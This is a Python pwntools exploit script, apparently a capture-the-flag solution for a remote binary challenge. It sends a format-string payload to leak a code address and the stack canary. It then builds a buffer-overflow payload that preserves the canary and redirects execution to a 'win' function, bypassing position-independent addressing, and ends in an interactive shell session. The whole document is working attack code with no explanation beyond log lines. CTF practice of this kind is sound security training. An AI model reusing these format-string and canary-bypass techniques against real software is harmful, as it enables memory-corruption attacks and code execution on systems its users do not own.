from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 12229)
    else:
        return process(e.path)


def ret_leaks():
    p.recvuntil(b'?')
    p.sendline(b'%10$p.%13$p')
    leaks = p.recv().split(b'.')
    main = int(leaks[0], 16)
    canary = int(leaks[1], 16)
    return main, canary


def throw_sploit(canary, more_win):
    p.sendline(cyclic(24)+p64(canary)+cyclic(8)+more_win)
    p.interactive()


p = start()
main, canary = ret_leaks()
log.info('Canary: %s' % hex(canary))
log.info('Main: %s' % hex(main))

e.address = main-0x1100
more_win = p64(e.address+0x1274)
throw_sploit(canary, more_win)
